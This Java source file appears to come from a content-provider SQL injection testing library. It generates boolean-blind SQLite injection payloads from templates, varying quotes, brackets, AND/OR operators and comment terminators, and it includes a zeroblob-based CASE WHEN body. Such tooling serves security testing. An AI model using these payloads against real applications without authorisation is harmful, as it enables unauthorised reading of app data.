// Copyright (c) 2019-2020 Calum Ewart Hutton
// Distributed under the GNU General Public License v3.0+, see the accompanying
// file LICENSE or https://opensource.org/licenses/GPL-3.0.

package lib.chutchut.cpmap.payload;

import java.util.LinkedHashSet;
import java.util.Set;

import lib.chutchut.cpmap.payload.base.InjectionPayload;
import lib.chutchut.cpmap.payload.base.Payload;
import lib.chutchut.cpmap.util.Util;
import lib.chutchut.cpmap.vector.CPVector;


public class BooleanBlindPayload extends InjectionPayload implements Payload.IPayload {

    public static final String NAME = "BOOLEAN";
    public static final int TYPE = 334;

    protected boolean boolState;
    protected String customBody;

    public static class Payloads {
        private static String[] templates = new String[] {
                "[FIELD][LCOND][LBR] [OP] [BODY] [ACOND] [EXTRA] ",
                "[FIELD][LCOND][LBR] [OP] [BODY] [ACOND] [EXTRA] --",
                "[FIELD][LCOND][LBR] [OP] [BODY] [ACOND] [EXTRA] /*",
                "[FIELD][LCOND][LBR] [OP] [BODY] [ACOND] [EXTRA] [OP] [RBR][RCOND]"
        };

        public static Set<BooleanBlindPayload> getDefault() {
            String customCaseBody = "CASE WHEN ([ICOND]) THEN zeroblob(999) ELSE zeroblob(99999999999999) END";
            return get(new String[] {InjectionPayload.defaultField, "[ICOND]"}, 2, new char[] {0, '\'', '"'}, new String[] {"AND", "OR"}, new boolean[] {true}, new String[] {null, customCaseBody});
        }

        public static Set<BooleanBlindPayload> get(String[] fields, int brNum, char[] quotes, String[] ops, boolean[] states, String[] bodys) {
            LinkedHashSet<BooleanBlindPayload> payloads = new LinkedHashSet<>();
            for (String tpl : templates) {
                for (String field : fields) {
                    for (int i = 0; i <= brNum; i++) {
                        for (char quote : quotes) {
                            for (String op : ops) {
                                for (boolean state : states) {
                                    for (String body : bodys) {
                                        Builder builder = new Builder(TYPE, NAME, tpl);
                                        builder.setField(field);
                                        builder.setBrackets(i);
                                        if (quote != 0) {
                                            builder.setQuoteChar(quote);
                                        } else {
                                            builder.setQuoteChar(null);
                                        }
                                        builder.setOperator(op);
                                        builder.setBoolState(state);
                                        builder.setCustomBody(body);
                                        BooleanBlindPayload payload = builder.build();
                                        // Dont add payloads with right conditional and no quote or brackets
                                        if (payload.templateHasKey("RCOND") && payload.getLBrackets() == 0 && payload.getRBrackets() == 0 && payload.getQuoteChar() == null) {
                                            continue;
                                        }
                                        payloads.add(payload);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return payloads;
        }
    }

    public static class Builder extends InjectionPayload.Builder {
        protected boolean boolState;
        protected String customBody;

        public Builder(int type, String name, String template) {
            super(type, name, template);
        }

        public Builder(BooleanBlindPayload payload, CPVector vector) {
            super(payload, vector);
            boolState = payload.boolState;
            customBody = payload.customBody;
        }

        public void setBoolState(boolean state) {
            boolState = state;
        }

        public void setCustomBody(String body) {
            customBody = body;
        }

        @Override
        public BooleanBlindPayload build() {
            return new BooleanBlindPayload(this);
        }
    }

    /*
     * Default constructor for Gson
     */
    protected BooleanBlindPayload() {
        super();
    }

    public BooleanBlindPayload(int type, String name, String template) {
        super(type, name, template);
    }

    protected BooleanBlindPayload(Builder builder) {
        super(builder);
        boolState = builder.boolState;
        customBody = builder.customBody;
    }

    public boolean getBoolState() {
        return boolState;
    }

    public String getCustomBody() {
        return customBody;
    }

    @Override
    public void renderPlaceholder(String key) {
        // Call parent to render base keys
        super.renderPlaceholder(key);
        switch (key) {
            case "BODY":
                setPlaceholder(key, renderBody());
                break;
            case "RCOND":
                setPlaceholder(key, renderRightCondition());
                break;
            case "LCOND":
                setPlaceholder(key, renderLeftCondition());
                break;
            case "ACOND":
                setPlaceholder(key, renderAdditionalConditions());
                break;
            case "FIELD":
                setPlaceholder(key, renderField());
                break;
        }
    }

    @Override
    public boolean isSupportedVector(CPVector vector) {
        // Expect a non-null vector, determine by read/write vector lists (excluding projection)
        return vector != null && vector.getType() != CPVector.PROJECTION && Util.listContains(vector.isQuery() ? CPVector.readVectorTypes : CPVector.writeVectorTypes, vector.getType());
    }

    private String renderBody() {
        String body;
        if (customBody == null) {
            // Simple body (i.e. 1=1)
            body = getCondition(boolState);
        } else {
            // Custom body (for CASE statements etc)
            body = replaceTemplatePlaceholder(customBody, "ICOND", getCondition(boolState));
        }
        return body;
    }

    private String renderRightCondition() {
        return getRightCondition(boolState);
    }

    private String renderLeftCondition() {
        return getLeftCondition(boolState);
    }

    private String renderAdditionalConditions() {
        return getAdditionalCondition(boolState, getOperator());
    }

    private String renderField() {
        return replaceTemplatePlaceholder(getField(), "ICOND", getCondition(boolState));
    }
}
